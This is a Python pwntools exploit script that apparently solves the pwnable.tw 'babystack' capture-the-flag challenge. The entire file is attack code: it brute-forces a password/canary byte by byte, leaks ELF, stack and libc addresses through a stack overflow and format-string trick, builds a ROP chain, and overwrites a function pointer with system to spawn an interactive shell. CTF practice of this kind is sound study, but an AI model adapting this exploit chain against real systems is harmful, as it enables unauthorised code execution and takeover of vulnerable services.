#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft
# import pwnlib.filepointer

c = remote('chall.pwnable.tw', 10205)
pwn_file="./ld-2.23.so.64 --library-path ./ ./babystack"
# c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_64.so.6'})
# print(c.libs())
e = ELF('./babystack')
libc = ELF('./libc_64.so.6')

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['alacritty', '-e', 'sh', '-c']

def debug():
    gdbcmd = '''source /usr/share/peda/peda.py
    file ./babystack
    info proc mappings
    set $elf_base={}
    #b *$elf_base+0xf53
    b *$elf_base+0xfee
    b *$elf_base+0xaa9
    #b *$elf_base+0x0e76
    # disas $elf_base+0xfee, +10
    c
    s
    stack 24
    bt
    '''.format(hex(c.libs()[c.cwd + c.argv[3].decode('utf8').strip('.')]))

    # gdb.attach(c, gdbcmd)
    # context.log_level ='debug'

def send_menu(command):
    c.recvuntil(':')
    c.sendline(command)

# Brute-force get CANARY
def brute_byte(old):
    for i in range(0xff):
        i += 1 # can't leak \0
        print(c.recvuntil('>>'))
        c.send('1' * 16)
        print('b')
        condition = c.recvn(6)
        if b'Your' in condition:
            c.send(old + p8(i) + b'\0')
            print('a')
            result = c.recvuntil('!')
            print(result)
            # find puts("Login Success !");
            if b'Success' in result:
                print(c.recvuntil('>>'))
                c.send('1' * 16)
                return old + p8(i)

    # all puts("Failed !");
    print('no solve Try again')
    assert(False)

def leak_pass():
    context.log_level='INFO'
    canary_len = 0x10
    passwd = b''
    for i in range(canary_len):
        passwd = brute_byte(passwd)
        print(passwd)

    context.log_level ='debug'
    return passwd

passwd = leak_pass()

# leak elf address
context.log_level='INFO'
buf_size = 6
leak_addr = passwd + b'1' * 16
for i in range(buf_size):
    leak_addr = brute_byte(leak_addr)
    print(leak_addr)
context.log_level ='debug'

e.address = u64(leak_addr[-6:] + b'\0\0') - 0x1060
rop = ROP(e, e.address)

nop_ret = rop.ret.address

def login():
    c.recvuntil('>>')
    c.send(flat({0x0: '1'}, filler = b's', length = 0x10))
    c.recvuntil(':')
    c.send('\0')

def logout():
    c.recvuntil('>>')
    c.send(flat({0x0: '1'}, filler = b's', length = 0x10))

def copy_to_mem():
    login()
    c.recvuntil('>>')
    c.send(flat({0x0: '3'}, filler = b's', length = 0x10))
    c.recvuntil(':')
    c.send('C' * 63)
    logout()

# buffer overflow
def write_stack(int64, index):

    # fix high byte
    c.send(flat({0x0: '1'}, filler = b's', length = 0x10))
    c.recvuntil(':')
    c.send(flat({0x40: passwd, 0x68 + 0x8 * index: p64(0xffffffffffffffff)[:-1] +b'\0'}, filler = b'A'))
    copy_to_mem()

    c.send(flat({0x0: '1'}, filler = b's', length = 0x10))
    c.recvuntil(':')
    c.send(flat({0x40: passwd, 0x68 + 0x8 * index: p64(0xffffffffffffffff)[:-2] +b'\0'}, filler = b'A'))
    copy_to_mem()

    # write address
    c.send(flat({0x0: '1'}, filler = b's', length = 0x10))
    c.recvuntil(':')
    c.send(flat({0x40: passwd, 0x68 + 0x8 * index: p64(int64)[:-2]}, filler = b'A'))

    copy_to_mem()

# rev ROP chain
write_stack(e.got['strncmp'], 2) # point to GOT strncmp
write_stack(e.address + 0xecf , 1)
write_stack(e.address + 0xb08 , 0)

def run_rop(string):
    login()
    c.recvuntil('>>')
    c.send(flat({0x0: '2 ' + string}, filler = b'st', length = 0x10))


def leak_stack_libc():
    run_rop('%12$p %6$s(')
    c.recvuntil('0x')
    result = c.recvuntil('(')[:-1].split(b' ')
    stack = int(result[0], 16) - (0xeaa8 - 0xe9d0)
    # point to GOT strncmp
    libc_base = u64(flat({0x0: result[1]}, filler=b'\0', length=0x8)) + (0x020000 - 0x164ea0)
    print(result)
    print(hex(stack), hex(libc_base))
    return stack, libc_base

print(hex(e.got['strncmp']))
rsp_addr, libc_base = leak_stack_libc()

c.sendline('')
print(c.recvuntil('Invalid choice\n'))
c.sendline('1')
c.recvuntil('>>')

passwd = leak_pass()

# call system
write_stack(libc_base + libc.symbols['system'] , 0)
run_rop(';sh;')

c.interactive()
c.close()
